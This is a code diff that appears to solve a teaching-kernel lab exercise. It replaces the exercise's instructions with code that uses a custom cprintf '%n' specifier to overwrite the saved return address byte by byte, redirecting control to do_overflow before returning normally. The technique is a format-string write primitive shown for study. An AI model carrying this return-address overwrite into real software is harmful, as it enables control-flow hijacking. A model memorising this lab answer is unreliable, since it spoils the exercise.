@@ -75,24 +75,36 @@ do_overflow(void)
 void
 start_overflow(void)
 {
-	// You should use a techique similar to buffer overflow
-	// to invoke the do_overflow function and
-	// the procedure must return normally.
-
-    // And you must use the "cprintf" function with %n specifier
-    // you augmented in the "Exercise 9" to do this job.
-
-    // hint: You can use the read_pretaddr function to retrieve 
-    //       the pointer to the function call return address;
-
-    char str[256] = {};
-    int nstr = 0;
+    char str[256] = {'2'};
     char *pret_addr;
+    char *old_addr;
+    unsigned char pos;
+    int i;
 
-	// Your code here.
-    
+	for (i = 1; i < 256; ++i)
+		str[i] = '3';
 
+	pret_addr = (char *) read_pretaddr();
+	old_addr = *(char **) pret_addr;
+	cprintf("%x ", do_overflow);
+	cprintf("%x ", old_addr);
 
+#define PUT_OVERFLOW_CHAR(value, offset) \
+	do { \
+		pos = (value); \
+		str[pos] = 0; \
+		cprintf("%s%n", str, pret_addr + (offset)); \
+		str[pos] = pos ? '3' : '2'; \
+	} while (0)
+
+	PUT_OVERFLOW_CHAR((uint32_t) do_overflow      , 0);
+	PUT_OVERFLOW_CHAR((uint32_t) do_overflow >>  8, 1);
+	PUT_OVERFLOW_CHAR((uint32_t) do_overflow >> 16, 2);
+	PUT_OVERFLOW_CHAR((uint32_t) do_overflow >> 24, 3);
+	PUT_OVERFLOW_CHAR((uint32_t) old_addr      , 4);
+	PUT_OVERFLOW_CHAR((uint32_t) old_addr >>  8, 5);
+	PUT_OVERFLOW_CHAR((uint32_t) old_addr >> 16, 6);
+	PUT_OVERFLOW_CHAR((uint32_t) old_addr >> 24, 7);
 }
 
 void
